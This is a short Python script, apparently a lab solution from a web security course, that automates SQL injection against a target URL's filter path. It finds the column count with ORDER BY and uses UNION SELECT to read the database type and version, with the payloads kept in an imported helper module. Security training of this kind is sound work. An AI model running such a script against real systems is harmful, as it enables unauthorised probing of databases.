# Lab 3 & 4 - SQL Injection: Query Database Type and Version
# Technique: ORDER BY to find column count, then UNION SELECT to extract version string
# Usage: python lab3&4.py <url>

import sys
import urllib3
from sqli_utils import check_vulnerability, banner, section, get_number_of_columns, detect_db_type

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH = "filter"

if __name__ == "__main__":
    banner()
    section("LAB 3 & 4 — SQL INJECTION: DB VERSION DUMP")

    if len(sys.argv) != 2:
        print("  Usage: python lab3&4.py <url>")
        sys.exit(1)

    target_url = sys.argv[1].rstrip("/") + "/"

    if not check_vulnerability(target_url, FILTER_PATH):
        print("\n  ✘  Exiting — target does not appear vulnerable.")
        sys.exit(1)

    col_num = get_number_of_columns(target_url, FILTER_PATH)
    if col_num is None:
        print("\n  ✘  Exiting — could not determine column count.")
        sys.exit(1)

    detect_db_type(target_url, col_num, FILTER_PATH)

    print(f"\n{'#' * 50}")
    print("#  Done.")
    print(f"{'#' * 50}\n")